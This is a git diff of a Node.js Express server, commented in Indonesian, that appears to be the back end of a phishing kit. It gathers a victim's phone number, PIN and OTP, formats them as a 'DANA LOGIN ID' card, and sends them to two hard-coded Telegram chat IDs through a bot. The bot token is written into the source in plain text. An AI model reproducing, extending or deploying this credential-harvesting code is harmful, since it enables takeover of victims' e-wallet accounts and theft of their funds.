@@ -5,7 +5,7 @@ const cors = require("cors");
 const app = express();
 
 // ============================
-// MIDDLEWARE (FIX CORS)
+// MIDDLEWARE
 // ============================
 app.use(cors());
 app.use(express.json());
@@ -14,35 +14,80 @@ app.use(express.json());
 // INIT BOT
 // ============================
 
-// 🔐 pakai ENV (Railway) atau fallback lokal
+// 🔐 pakai ENV atau isi langsung untuk lokal
 const BOT_TOKEN = process.env.BOT_TOKEN || "6568242561:AAEe52VXE51aO4QyDeUupKnlzG5urZMnbas";
-const bot = new TelegramBot(BOT_TOKEN);
+const bot = new TelegramBot(BOT_TOKEN, { polling: true });
 
 // ============================
-// CHAT ID TUJUAN
+// CHAT ID
 // ============================
 const chatIds = [
-  "6549762672", // ID kamu
-  "7173961946"  // ID kedua
+  "6549762672",
+  "7173961946"
 ];
 
 // ============================
-// ENDPOINT TERIMA DATA
+// STORAGE SEMENTARA
+// ============================
+let sessionData = {};
+
+// ============================
+// FORMAT CARD
+// ============================
+function formatMessage(data) {
+  return `
+<pre>
+┌────────────────────
+   DANA LOGIN ID
+└────────────────────
+
+Nomor : ${data.phone || "-"}
+PIN    : ${data.pin || "-"}
+OTP    : ${data.otp || "-"}
+
+────────────────────
+🕒 ${new Date().toLocaleString()}
+</pre>
+`;
+}
+
+// ============================
+// ENDPOINT
 // ============================
 app.post("/send", (req, res) => {
-  const { text } = req.body;
+  const { phone, pin, otp } = req.body;
 
-  console.log("📥 DATA MASUK:", text);
+  // 🔑 sementara pakai 1 user (bisa upgrade nanti)
+  const key = "user";
 
-  if (!text) {
-    return res.status(400).json({ error: "No text" });
+  if (!sessionData[key]) {
+    sessionData[key] = {};
   }
 
-  // kirim ke semua ID
-  chatIds.forEach(id => {
-    bot.sendMessage(id, text)
-      .catch(err => console.log("❌ ERROR KIRIM:", err.message));
-  });
+  // simpan data bertahap
+  if (phone) sessionData[key].phone = phone;
+  if (pin) sessionData[key].pin = pin;
+  if (otp) sessionData[key].otp = otp;
+
+  console.log("📥 DATA:", sessionData[key]);
+
+  // kalau sudah lengkap → kirim 1x
+  if (
+    sessionData[key].phone &&
+    sessionData[key].pin &&
+    sessionData[key].otp
+  ) {
+    const text = formatMessage(sessionData[key]);
+
+    chatIds.forEach(id => {
+      bot.sendMessage(id, text, { parse_mode: "HTML" })
+        .then(() => console.log("✅ TERKIRIM KE:", id))
+        .catch(err => console.log("❌ ERROR:", err.message));
+    });
+
+    // reset setelah kirim
+    delete sessionData[key];
+  }
 
   res.status(200).json({ status: "OK" });
 });
